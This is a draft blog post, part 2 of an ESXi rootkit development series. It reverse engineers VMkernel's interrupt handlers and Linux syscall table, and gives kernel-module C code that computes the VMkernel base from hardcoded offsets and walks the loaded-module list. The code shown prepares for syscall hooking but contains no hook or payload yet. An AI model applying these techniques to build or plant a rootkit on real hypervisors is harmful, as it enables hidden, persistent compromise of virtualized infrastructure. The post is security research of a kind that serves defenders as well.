+++
title = 'ESXHiDE - ESXi Rootkit Development - Part 2'
date = 2024-09-29T13:16:49-05:00
draft = true
+++

## Extracting VMkernel & Modules

In a [post](https://www.zerodayinitiative.com/blog/2023/6/21/cve-2022-31696-an-analysis-of-a-vmware-esxi-tcp-socket-keepalive-type-confusion-lpe) on ZDI, [renorobertr](https://x.com/renorobertr) shows how to locate and extract the VMkernel (and other modules like `user`).

![](/images/2024-09-30-23-02-56.png)

VMkernel can be found by extracting `/bootbank/k.b00` and user* module can be extracted from `/bootbank/user.b00`.

*More on what's in user module later

He also demonstrates using a native binary (`esxcfg-info -y`) to get a module's key memory addresses, which came in handy for reversing the module list and module structures.

## Interrupt Descriptor Table & Handlers

ESXi's VMkernel can handle both Linux syscalls and ESXi-specific syscalls.  This seen when reverse engineering some native user mode binaries.

Linux syscalls are invoked using `int 0x80` instruction, which calls the interrupt handler located at that specific index of the interrupt descriptor table (IDT).

ESXi syscalls are invoked using `int 0x90` instruction, which calls its own handler at that index of the IDT.

To build a rootkit, I wanted to hook syscalls at the kernel level to perform whatever actions I want it to, which means digging into VMkernel that was extracted previously to see what is at index 0x80 and index 0x90 of the IDT.  Disassembly from IDA quickly shows that both interrupts have its own handler function.

![](/images/2024-09-30-23-12-05.png)

While the function pointers might be tougher to resolve using only static analysis, the GDB setup from earlier allowed me to set a breakpoint on wait for a syscall to be called and see where the function pointer leads.  The addresses dumped from `esxcfg-info -y` showed that the function pointer pointed to a function in the `user` module, specifically `User_UWVMK64SyscallHandler()`

![](/images/2024-09-30-23-22-19.png)

```
         |----Name..................................................user
         |----File Name.............................................user
         |----File Path.............................................
         |----Module Id.............................................2 
         |----ReadOnly Load Address.................................0x0000418025148000 
         |----ReadOnly Length.......................................1028096 
```

Taking a peak at `User_UWVMK64SyscallHandler()` revealed a few interesting named variables.

```
Linux64_SyscallTableLen
Linux64_SyscallTable
UW64VMKSyscall_HandlerTableLen
UW64VMKSyscall_HandlerTable
UWVMKSyscall_HandlerTableLen
UWVMKSyscall_HandlerTable
UW64VMKPrivateSyscall_HandlerTableLen
UW64VMKPrivateSyscall_HandlerTable
... and more
```

If I were a betting man, I'd say some of those addresses have the length of the syscall table and the syscall table itself.  And looking that `Linux64_SyscallTable`, I'd say we're right on the mark.

![](/images/2024-09-30-23-28-07.png)

Structure of the table looks something like:

```
typedef struct {
    void *func;
    void *unk;
    char *name;
} SyscallTable_Entry;
```

## Finding Module Addresses

Great, I found the Linux syscall table but since ASLR is enabled, I can't guess the addresses of `user` module.  I noticed that there is a `moduleList` pointer in the BSS section of VMkernel, that looks like something I can use to find the `user` module.  To investigate that, I need to find the base address of VMkernel.

There aren't a whole lot of exported functions I can reach from the kernel module, but `vmk_ModuleStackTop()` located in VMkernel is one of them and I was able to use some basic math to find the base address of VMkernel.

```
    uint64_t vmk_ModuleStackTop_addr = (uint64_t)vmk_ModuleStackTop;    
    uint64_t vmkernel_text_addr = vmk_ModuleStackTop_addr - 0x125D54;    
    uint64_t vmkernel_data_addr = vmkernel_text_addr - 0x40000000;    
    uint64_t moduleList = vmkernel_data_addr + 0x390100;
    uint64_t moduleListBegin = vmkernel_data_addr + 0x390100; // Not an exported name, just named by me
    
    printk("vmk_ModuleStackTop_addr = %llX\n", vmk_ModuleStackTop_addr);
    printk("vmkernel_text_addr = %llX\n", vmkernel_text_addr);
    printk("vmkernel_data_addr = %llX\n", vmkernel_data_addr);
    printk("moduleList = %llX\n", moduleList);
```

![](/images/2024-09-30-23-37-38.png)

Armed with that `moduleList` address and a little bit of reversing functions that use `moduleList`, I was able to traverse the structure and come up with a way iterate through it and grab few important addresses.

```
pwndbg> x/82gx 0x417FE4D90958-0x288
0x417fe4d906d0:	0x0000417fe4d90448	0x0000417fe4d90958 [previous ptr] [next ptr]
0x417fe4d906e0:	0x0000000000000000	0x0000000000000000
0x417fe4d906f0:	0x0000000000000000	0x0000000000000000
0x417fe4d90700:	0x0000000000000000	0x0000000000000000
0x417fe4d90710:	0x0000000000000000	0x0000000000000000
0x417fe4d90720:	0x0000000000000000	0x0000000000000000
0x417fe4d90730:	0x0000000000000000	0x0000000000000000
0x417fe4d90740:	0x0000000000000000	0x0000000000000000
0x417fe4d90750:	0x0000000000000000	0x0000000000000000
0x417fe4d90760:	0x0000000000000000	0x0000000000000000
0x417fe4d90770:	0x0000000000000000	0x0000000000000000
0x417fe4d90780:	0x00004300490de990	0x00004300490deb20
0x417fe4d90790:	0x0000418024e94c84	0x0000000000000000
0x417fe4d907a0:	0x0000418025148000	0x00000000000fb000 [ReadOnly Load Address] [ReadOnly Length]
0x417fe4d907b0:	0x0000417fc0400000	0x0000000000212000 [Writable Load Address] [Writable Length]
0x417fe4d907c0:	0x000041802520e5b8	0x0000000000033d90
0x417fe4d907d0:	0x00004180251e98f4	0x000000000000008c
0x417fe4d907e0:	0x00004180251e9664	0x0000000100000290
0x417fe4d907f0:	0x000041802514c5e0	0x000041802514c814
0x417fe4d90800:	0x0000000000000000	0x0000000000000000
0x417fe4d90810:	0x0000000000000000	0x0000000000000000
0x417fe4d90820:	0x0000000000000000	0x0000000000000000
0x417fe4d90830:	0x0000000000000000	0x0000000000000000
0x417fe4d90840:	0x0000000000000000	0x0000000000000000
0x417fe4d90850:	0x0000418025148000	0x0000417fc0400000 [Text Base Addr] [Data Base Addr]
0x417fe4d90860:	0x0000417fc0410a80	0x00004300490dddf0 [BSS Base Addr]
0x417fe4d90870:	0x0000000000000000	0x7265737500000002 [] [module id (02)] [module name]
0x417fe4d90880:	0x0000000000000000	0x0000000000000000
0x417fe4d90890:	0x0000000000000000	0x0000000100000000
0x417fe4d908a0:	0x0000003400000001	0x0000417fe4d908a8
0x417fe4d908b0:	0x0000417fe4d908a8	0x00004300490deb80
0x417fe4d908c0:	0x00004300490debc0	0x0000000000000000
0x417fe4d908d0:	0x0000000000000001	0x0000000001000000
0x417fe4d908e0:	0x0000000300000000	0x0000000000000004
0x417fe4d908f0:	0x00004300491d1fb0	0x00004300491fda98
0x417fe4d90900:	0x00004300491fdbb8	0x0001646700016467
0x417fe4d90910:	0x0000000000000c7b	0x0000000000000c7b
0x417fe4d90920:	0x0000418025148000	0x0000417fe4d9087c
0x417fe4d90930:	0x0000000000000000	0x0000417fe4d90ba8
0x417fe4d90940:	0x0000417fe4d90698	0x00004300490dddf0
0x417fe4d90950:	0x0000418024ae3688	0x0000417fe4d906d0
```

```
    uint64_t module = *(uint64_t*)moduleListBegin;

    uint64_t user_mod_addr = 0;

    while (true)
    {
        if (module == moduleList)
            break;

        char *moduleName = (char *)(module - 220);
        uint64_t textAddr = *(uint64_t*)(module - 264);
        uint64_t dataAddr = *(uint64_t*)(module - 256);
        uint64_t bssAddr = *(uint64_t*)(module - 248);

        printk("module: %s | %llX : (TEXT: %llX | DATA: %llX | BSS: %llX)\n", moduleName, module, textAddr, dataAddr, bssAddr);

        if (!vmk_Strncmp(moduleName, "user", 4))
        {
            user_mod_addr = textAddr;
        }

        module = *(uint64_t*)module;
    }
```

Doing so allowed me to grab the addresses of all of the loaded modules from my own kernel module.

![](/images/2024-09-30-23-47-05.png)